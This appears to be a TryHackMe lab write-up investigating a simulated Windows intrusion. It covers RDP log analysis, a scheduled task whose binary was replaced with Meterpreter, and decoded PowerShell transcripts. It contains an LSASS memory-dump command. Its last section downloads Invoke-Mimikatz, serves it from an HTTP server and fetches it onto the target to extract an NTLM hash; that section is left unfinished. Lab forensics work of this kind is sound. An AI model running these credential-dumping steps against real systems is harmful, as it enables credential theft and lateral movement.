<h1 align="center">Elevating Movement</h1>
<p align="center">2025, November 8  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>1</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>Investigate the second, Windows part of the Honeynet Collapse! &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/elevatingmovement">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/7c99579b-0a08-4e18-9045-80dad21d2287"></p>

<h2>Task 1 . Introduction</h2>
<h3>Meet DeceptiTech</h3>
<p>DeceptiTech is a fast-growing cyber security company specializing in honeypot development and deception technologies. At the heart of their success are DeceptiPots - lightweight, powerful, and configurable honeypots that you can install on any OS and capture every malicious action!<br>

The internal DeceptiTech network is organized around a traditional on-premises Active Directory domain with approximately 50 active users. The product platform, however, is isolated and hosted entirely in the AWS cloud:</p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/34793d11-ee28-43ae-a4b0-c2ed81bbd0c6"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<h3>Elevating Movement</h3>
<p>One ordinary morning, DeceptiTech's entire network collapsed. Within minutes, all critical on-premises systems were locked down and encrypted. The IT department hurried to restore backups, while the security team rushed to their SIEM - only to find the backups corrupted and all SIEM data wiped clean.<br>

This room is about the second attack stage (#2 on the network diagram). As part of an external DFIR unit, can you help DeceptiTech perform a full-scope investigation and explain how the attack continued?</p>

<p><em>Answer the question below</em></p>

<p>1.1. Let´s go!<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>No answer needed</code></p>

<br>
<h2>Task 2 . The Challenge</h2>
<h3>Set up your environement</h3>
<p>To successfully complete this room, you'll need to set up your virtual environment. This involves starting the Target Machine, ensuring you're equipped with the necessary tools and access to tackle the challenges ahead.</p>

<h3>Elevating Movement</h3>
<p><em>Hey Emily, when you are done with DeceptiPot deployment, can you take a look at SRV-IT-QA? It became unstable after we replaced the motherboard, so maybe you can debug what's going on there. ~ Matthew<br>

While Emily worked on the issue from a local admin account, the threat actor continued the attack. With the entry point secured and Emily's domain credentials stolen, they now wanted to explore opportunities for privilege escalation. Leveraging your knowledge of Windows forensics, can you uncover the elevating movement?</em></p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/6449fe3f-794e-4508-9ffb-ebff35d9c7c6"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6

<p><em>Answer the questions below</em></p>

<br>
<p>2.1. When did the attacker perform RDP login on the server? Answer Format Example: 2025-01-15 19:30:45<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>2025-06-30 16:33:18</code><br>

```bash
:~/ElevatingMovement# nmap -p- -T4 xx.xx.xx.xx
...
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```

```bash
:~/ElevatingMovement# nmap -sC -sV -Pn -p3389,5985 -T4 xx.xx.xx.xx
...PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DECEPT
|   NetBIOS_Domain_Name: DECEPT
|   NetBIOS_Computer_Name: SRV-IT-QA
|   DNS_Domain_Name: deceptitech.thm
|   DNS_Computer_Name: SRV-IT-QA.deceptitech.thm
|   DNS_Tree_Name: deceptitech.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-26Txx:xx:xx+00:00
| ssl-cert: Subject: commonName=SRV-IT-QA.deceptitech.thm
| Not valid before: 2025-06-19Txx:xx:xx
|_Not valid after:  2025-12-19Txx:xx:xx
|_ssl-date: 2025-10-26Txx:xx:xx+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
```
  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - launch <code>Event Viewer</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - select <code>Applications and Service Logs</code> → <code>Microsoft</code> → <code>Windows</code> → <code>TerminalServices-RemoteConnectionManager</code> → <code>Operational</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - look for <strong>Event ID</strong> : <code>1149</code> (successfull Windows RDP login) and <strong>IP</strong> : <code>172.16.8.239</code><br>

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/e834b26e-eeee-4afd-9f81-9929bc18c70c"></p>

<br>
<p>2.2. What is the full path to the binary that was replaced for persistence and privesc?<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>C:\Users\emily.ross\Documents\Coreinfo64.exe</code><br>
  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - launch <code>Task Scheduler</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - select <code>Task Scheduler Library</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - double-click the task owned by <code>SRV-IT-QA</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - click <code>Actions</code><br>

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/9a935f7a-7f35-4e5a-a9eb-b17eaccb79a3"></p>


<br>
<p>2.3. What is the type or malware family of the replaced binary?<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Meterpreter</code><br>
  
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - execute the command line below to get the MD5 hash of the replaced binary<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - navigate to <code>VirusTotal</code>, paste the hash, then hit ENTER<br>

```bash
PS C:\Users\emily.ross\Documents> Get-FileHash "Coreinfo64.exe" -Algorithm MD5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             42050FD1614C70266DDCEF0A419478C8                                       C:\Users\emily.ross\Documents...


PS C:\Users\emily.ross\Documents>
```

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/4192b652-cd47-4204-be16-448bcff4ad3e"></p>

<br>
<p>2.4. Which full command line was used to dump the OS credentials?<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>pcd.exe /accepteula -ma lsass.exe text.txt</code></p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - remember that the successfull RDP connection took place on <code>2025-06-30</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - launch <code>File Explorer</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - navigate to <code>Users</code> → <code>Administrator</code> → <code>Documents</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - identify 2 directories<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - access <code>20250630</code> updated on <code>2025-06-30</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - open <code>PowerShell_transcript.SRV-IT-QA.KSUYD5bK.20250630182641</code><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - decode the Base64 excerpts in the previous file<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - the first one confirms 2.3.´s answer<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - advance and uncover 2.4´s answer<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - hint: save the encoded excerpt as <code>ANSI</code>.<br>

```bash
C:\Users\Administrator\Documents\certutil -decode a.txt decoded.txt
```

```bash
C:\Users\Administrator\Documents\type decoded.txt
```

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/79ec68d7-6c7b-44e4-8e93-a2134b5c9312"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/0c515fbd-0774-4cbd-abf4-fc59af81295a"><br><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/cf1009ee-d997-47fe-80ca-059a10fcb676"><br><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/34ba053b-1319-4a67-8c85-df2a96fbf831"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/9410fbbf-6a39-499e-bb37-047c098a25ef"><br><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/378978f9-f0ac-444a-a828-12c3380e8235"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/47bb6d22-cf88-46c1-ab1e-a0ec2c043d48"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/b1f21d56-ede1-49e2-8a90-99fc827588ee"></p>

<br>
<p>2.5. Using the stolen credentials, when did the attacker perform lateral movement? Answer Format Example: 2025-01-15 19:30:45<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>2025-06-30 19:47:14</code></p>

- execute the command below to generate a .csv file containing....<br>
- launch <code>TimelineExplorer</code> which is in C:\Users\Administrator\Desktop\EZ tools\TimelineExplorer<br>
- analyze considering the date and time discovered in 2.1. reflected in <code>Run Time</code> column<br>

```bash
C:\Users\Administrator\Desktop\PECmd.exe C:\Windows\Prefetch --csv ..\Prefetch --csf analysis.csv
```

<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/f9e1648b-0d5c-4b5f-8ef2-134998425d43"><br>
<img width="600px" hspace="30" src="https://github.com/user-attachments/assets/3484647b-bfcb-49bf-b8f9-19eb17a32780"><br>
<img width="600px" hspace="30" src="https://github.com/user-attachments/assets/9b80c8b4-ddb6-4f4c-8319-e597a05d1dc4"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/42ba344d-7bd0-4bbe-b15a-4b9b0e587399"><br>
<img width="900px" hspace="30" src="https://github.com/user-attachments/assets/bbcd75f6-ce5f-4884-8703-1cbed25f7a4d"></p>

<br>
<p>2.6. What is the NTLM hash of matthew.collins' domain password?<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>____</code></p>


```bash
:~/ElevatingMovement# curl -OL https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
```

<img width="1227" height="165" alt="image" src="https://github.com/user-attachments/assets/be01a080-8590-45e0-a023-4c841cf17b90" />

<br>
<br>

```bash
:~/ElevatingMovement# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```


```bash
10.82.123.166
```

```bash
C:\>mkdir tmp
```

```bash
C:\>cd tmp
```

```bash
C:\tmp>curl http://xx.xx.xxx.xxx:8000/Invoke-Mimikatz.exe -o Invoke-Mimikatz.exe
```

```bash
C:\tmp>ls
```

```bash
C:\tmp>ls
```



<img width="1189" height="202" alt="image" src="https://github.com/user-attachments/assets/91e47436-a8e5-448b-a5da-35627a8424e2" />
